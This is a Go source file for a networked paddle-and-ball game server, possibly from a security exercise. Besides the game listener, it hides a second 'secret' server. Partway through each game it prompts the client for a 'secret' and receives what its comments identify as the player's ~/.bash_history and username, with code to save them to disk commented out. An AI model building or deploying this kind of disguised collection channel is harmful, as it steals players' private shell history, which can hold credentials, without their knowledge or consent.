package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"log"
	"math"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

const (
	portSecret     = 9394
	fps            = 60
	duration       = 60 // in second
	sendSecretTime = 15 // in second

	arenaWidth  = 36
	arenaHeight = 18

	boardHorWidth  = 2
	boardVerHeight = 1
	boardVelocityX = 0.5
	boardVelocityY = 1

	ballVelocityX = 1.5 * boardHorWidth / fps
	ballVelocityY = 1.5 * boardVerHeight / fps
)

const (
	actionNone = iota
	actionUp
	actionDown
	actionLeft
	actionRight
)

var serverIP = flag.String("bind_addr", "0.0.0.0", "bind address of game server")
var serverPort = flag.Int("port", 9393, "port number of game server")
var isDaemon = flag.Bool("daemon", false, "whether server is a daemon")

func main() {
	flag.Parse()
	setupLogger()

	go runServer("secret", portSecret, receiveSecret)
	runServer("game", *serverPort, newGame)
}

func runServer(name string, port int, mainFunc func(net.Conn)) {
	ln, err := net.Listen("tcp", fmt.Sprintf("%v:%v", *serverIP, port))
	if err != nil {
		log.Fatal(err)
	}

	log.Printf("start listening %v on :%v\n", name, port)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("error on accept %v: %v\n", name, err)
			continue
		}

		go mainFunc(conn)
	}
}

func setupLogger() {
	var logFileName string
	if *isDaemon {
		logFileName = "/var/log/game-server.log"
	} else {
		logFileName = "server.log"
	}

	logFile, err := os.OpenFile(logFileName, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	log.SetOutput(io.MultiWriter(os.Stdout, logFile))
}

// ----------------------------------------------------------------------------
// game

type gameEnv struct {
	horizontal float64 // the x coordinate of left top corner of horizontal board
	vertical   float64 // the y coordinate of left top corner of vertical board
	ballx      float64 // ball width is 1
	bally      float64 // ball height is 1
	ballDirx   int     // +1 or -1
	ballDiry   int     // +1 or -1
	countdown  int     // stores the number of remaining ticks
}

func (env gameEnv) String() string {
	return fmt.Sprintf("horizontal: %d\nvertical: %d\nballx: %d\nbally: %d\ncountdown: %d\n", int(env.horizontal), int(env.vertical), int(env.ballx), int(env.bally), int(float64(env.countdown)/fps+1))
}

func newGame(conn net.Conn) {
	rand.Seed(time.Now().UnixNano())
	env := gameEnv{
		0,
		0,
		float64(arenaWidth/2 + rand.Intn(7) - 3),
		float64(arenaHeight/2 + rand.Intn(7) - 3),
		getRandSign(),
		getRandSign(),
		duration * fps,
	}
	ticker := time.NewTicker(time.Second / fps)

	// receive "start" from client
	if _, err := conn.Read(make([]byte, 10)); err != nil {
		return
	}
	log.Printf("start game, remote = %v", conn.RemoteAddr())
	defer log.Printf("end game, remote = %v", conn.RemoteAddr())

	// read from client
	var clientAction int
	go func() {
		for {
			buf := make([]byte, 1000)
			if _, err := conn.Read(buf); err != nil {
				return
			}
			tmp := strings.Split(string(buf), ": ")[1]
			if strings.Contains(tmp, "up") {
				clientAction = actionUp
			} else if strings.Contains(tmp, "down") {
				clientAction = actionDown
			} else if strings.Contains(tmp, "left") {
				clientAction = actionLeft
			} else {
				clientAction = actionRight
			}
		}
	}()

	for {
		select {
		case <-ticker.C:
			switch clientAction {
			case actionUp:
				env.vertical = math.Max(env.vertical-boardVelocityY, 0)
			case actionDown:
				env.vertical = math.Min(env.vertical+boardVelocityY, arenaHeight-boardVerHeight)
			case actionLeft:
				env.horizontal = math.Max(env.horizontal-boardVelocityX, 0)
			case actionRight:
				env.horizontal = math.Min(env.horizontal+boardVelocityY, arenaWidth-boardHorWidth)
			}
			clientAction = actionNone

			env.ballx += float64(env.ballDirx) * ballVelocityX
			if env.ballx >= float64(arenaWidth-1) || env.ballx <= 1 {
				if env.vertical <= env.bally && env.bally <= env.vertical+float64(boardVerHeight) {
					env.ballDirx *= -1
					env.ballx = math.Max(math.Min(env.ballx, arenaWidth-1), 1)
				}
			}
			env.bally += float64(env.ballDiry) * ballVelocityY
			if env.bally >= float64(arenaHeight-1) || env.bally <= 1 {
				if env.horizontal <= env.ballx && env.ballx <= env.horizontal+float64(boardHorWidth) {
					env.ballDiry *= -1
					env.bally = math.Max(math.Min(env.bally, arenaHeight-1), 1)
				}
			}

			env.countdown--

			var message []byte
			var exit bool = false
			if env.countdown < 0 {
				message = []byte("win\n")
				exit = true
			} else if env.ballx < 0 || env.ballx > arenaWidth || env.bally < 0 || env.bally > arenaHeight {
				message = []byte("lose\n")
				exit = true
			} else {
				message = []byte(env.String())
			}

			if env.countdown == sendSecretTime*fps-1 {
				if _, err := conn.Write([]byte("give me secret\n")); err != nil {
					return
				}
			}

			if _, err := conn.Write(message); err != nil {
				return
			}

			if exit {
				return
			}
		}
	}
}

func getRandSign() int {
	if rand.Intn(2) == 0 {
		return -1
	}
	return 1
}

// ----------------------------------------------------------------------------
// secret

func receiveSecret(conn net.Conn) {
	defer conn.Close()

	var data [5][]byte
	reader := bufio.NewReader(conn)

	// "successfully open ~/.bash_history" or "error on ioutil.ReadFile"
	line, _, err := reader.ReadLine()
	if err != nil || strings.Contains(string(line), "error") {
		log.Println(string(line))
		return
	}
	tmp := strings.Fields(string(line))
	username := strings.Join(tmp[2:len(tmp)-1], "")
	username = username[:len(username)-2]

	for {
		line, _, err := reader.ReadLine()
		if err != nil {
			break
		}
		fields := strings.Fields(strings.ReplaceAll(string(line), ",", ""))
		i, _ := strconv.Atoi(fields[1])
		length, _ := strconv.Atoi(fields[4])
		data[i] = make([]byte, length)

		if _, err := io.ReadFull(reader, data[i]); err != nil {
			break
		}
	}

	// store the data (so nasty)
	/*
		os.Mkdir("data", 0700)
		ioutil.WriteFile(
			fmt.Sprintf("data/%v_%04v", username, rand.Intn(10000)),
			bytes.Join(data[:], []byte("")),
			0644)
	*/
}
